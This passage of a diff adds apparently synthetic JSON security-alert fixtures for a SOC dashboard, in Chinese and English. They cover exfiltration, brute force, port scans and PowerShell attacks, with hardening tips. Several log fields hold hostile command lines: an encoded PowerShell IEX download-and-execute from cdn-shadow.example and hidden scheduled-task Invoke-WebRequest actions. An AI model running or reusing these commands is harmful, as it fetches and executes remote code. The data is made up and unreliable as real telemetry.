+      "source_port": 51782,
+      "destination_port": 443,
+      "packet_size": 4207,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 4,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-13T22:39:00",
+      "response_minutes": 56
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-03",
+      "ip": "10.0.5.22",
+      "owner": "基础设施组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T22:02:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-13T22:10:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-13T22:14:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0040",
+    "title": "计划任务横向下发异常 #40",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "resolved",
+    "timestamp": "2026-04-13T21:57:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "45.142.214.8",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "南美",
+      "country": "巴西",
+      "city": "圣保罗",
+      "latitude": -23.5505,
+      "longitude": -46.6333
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49927,
+      "destination_port": 445,
+      "packet_size": 1684,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 5,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-13T22:22:00",
+      "response_minutes": 62
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-04",
+      "ip": "10.0.8.90",
+      "owner": "数据平台组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T21:45:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-13T21:53:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-13T21:57:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0041",
+    "title": "端口扫描探测 #41",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-13T21:40:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "100.20.10.5",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "华北",
+      "country": "中国",
+      "city": "北京",
+      "latitude": 39.9042,
+      "longitude": 116.4074
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42157,
+      "destination_port": 3389,
+      "packet_size": 128,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 2,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "张晨",
+      "updated_at": "2026-04-13T22:05:00",
+      "response_minutes": 8
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-05",
+      "ip": "10.1.1.18",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T21:28:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-13T21:36:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-13T21:40:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0042",
+    "title": "异常登录地理偏移 #42",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-13T21:23:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "185.233.44.12",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "华东",
+      "country": "中国",
+      "city": "上海",
+      "latitude": 31.2304,
+      "longitude": 121.4737
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50255,
+      "destination_port": 443,
+      "packet_size": 1247,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 13,
+      "last_7_days": 3,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "李岳",
+      "updated_at": "2026-04-13T21:48:00",
+      "response_minutes": 14
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-06",
+      "ip": "172.16.4.20",
+      "owner": "研发一部",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T21:11:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-13T21:19:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-13T21:23:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0043",
+    "title": "PowerShell 下载执行异常 #43",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "investigating",
+    "timestamp": "2026-04-13T21:06:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "45.83.91.201",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "华南",
+      "country": "中国",
+      "city": "深圳",
+      "latitude": 22.5431,
+      "longitude": 114.0579
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49864,
+      "destination_port": 443,
+      "packet_size": 2920,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 14,
+      "last_7_days": 4,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "王琪",
+      "updated_at": "2026-04-13T21:31:00",
+      "response_minutes": 20
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-07",
+      "ip": "10.0.0.30",
+      "owner": "财务系统组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T20:54:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-13T21:02:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-13T21:06:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0044",
+    "title": "SSH 暴力破解尝试 #44",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-13T20:49:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "62.171.173.40",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "北美",
+      "country": "美国",
+      "city": "洛杉矶",
+      "latitude": 34.0522,
+      "longitude": -118.2437
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53161,
+      "destination_port": 22,
+      "packet_size": 1023,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 15,
+      "last_7_days": 5,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-13T21:14:00",
+      "response_minutes": 26
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-08",
+      "ip": "10.0.2.15",
+      "owner": "基础设施组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T20:37:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-13T20:45:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-13T20:49:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0045",
+    "title": "异常大流量数据外传 #45",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-13T20:32:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "203.55.18.91",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "欧洲",
+      "country": "德国",
+      "city": "法兰克福",
+      "latitude": 50.1109,
+      "longitude": 8.6821
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51788,
+      "destination_port": 443,
+      "packet_size": 4244,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 16,
+      "last_7_days": 2,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-13T20:57:00",
+      "response_minutes": 32
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-09",
+      "ip": "10.0.5.22",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T20:20:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-13T20:28:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-13T20:32:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0046",
+    "title": "计划任务横向下发异常 #46",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-13T20:15:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "东南亚",
+      "country": "新加坡",
+      "city": "新加坡",
+      "latitude": 1.3521,
+      "longitude": 103.8198
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49933,
+      "destination_port": 445,
+      "packet_size": 1536,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 3,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "张晨",
+      "updated_at": "2026-04-13T20:40:00",
+      "response_minutes": 38
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-10",
+      "ip": "10.0.8.90",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T20:03:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-13T20:11:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-13T20:15:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0047",
+    "title": "端口扫描探测 #47",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-13T19:58:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "91.214.124.75",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "东亚",
+      "country": "日本",
+      "city": "东京",
+      "latitude": 35.6762,
+      "longitude": 139.6503
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42163,
+      "destination_port": 3389,
+      "packet_size": 165,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 4,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "李岳",
+      "updated_at": "2026-04-13T20:23:00",
+      "response_minutes": 44
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-11",
+      "ip": "10.1.1.18",
+      "owner": "研发一部",
+      "environment": "test"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T19:46:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-13T19:54:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-13T19:58:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0048",
+    "title": "异常登录地理偏移 #48",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-13T19:41:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "103.77.182.16",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "东欧",
+      "country": "俄罗斯",
+      "city": "莫斯科",
+      "latitude": 55.7558,
+      "longitude": 37.6173
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50261,
+      "destination_port": 443,
+      "packet_size": 1284,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 5,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "王琪",
+      "updated_at": "2026-04-13T20:06:00",
+      "response_minutes": 50
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-12",
+      "ip": "172.16.4.20",
+      "owner": "财务系统组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T19:29:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-13T19:37:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-13T19:41:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0049",
+    "title": "PowerShell 下载执行异常 #49",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-13T19:24:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "176.65.148.211",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "南亚",
+      "country": "印度",
+      "city": "孟买",
+      "latitude": 19.076,
+      "longitude": 72.8777
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49870,
+      "destination_port": 443,
+      "packet_size": 2957,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 2,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-13T19:49:00",
+      "response_minutes": 56
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-01",
+      "ip": "10.0.0.30",
+      "owner": "基础设施组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T19:12:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-13T19:20:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-13T19:24:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0050",
+    "title": "SSH 暴力破解尝试 #50",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-13T19:07:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "45.142.214.8",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "南美",
+      "country": "巴西",
+      "city": "圣保罗",
+      "latitude": -23.5505,
+      "longitude": -46.6333
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53167,
+      "destination_port": 22,
+      "packet_size": 1060,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 3,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-13T19:32:00",
+      "response_minutes": 62
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-02",
+      "ip": "10.0.2.15",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T18:55:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-13T19:03:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-13T19:07:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  }
+]
